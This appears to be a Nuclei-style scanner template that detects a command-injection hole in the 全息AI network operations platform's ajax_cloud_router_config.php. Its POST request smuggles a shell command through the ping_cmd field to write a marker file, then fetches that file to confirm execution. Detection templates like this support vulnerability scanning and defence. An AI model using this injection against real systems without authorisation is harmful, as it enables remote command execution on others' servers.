id: quanxiAI-ajax_cloud_router_config-rce

info:
  name: 全息AI网络运维平台ajax_cloud_router_config.php存在命令执行漏洞
  author: quanxiAI
  severity: critical
  tags: quanxiAI

http:
  - raw:
      - |
        POST /nmss/cloud/Ajax/ajax_cloud_router_config.php HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

        ping_cmd=8.8.8.8|echo 15dd36s9d5f25d > 13d62d.txt

      - |+
        GET /nmss/cloud/Ajax/13d62d.txt HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Encoding: gzip, deflate

    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body_2
        words:
          - '15dd36s9d5f25d'
    matchers-condition: and
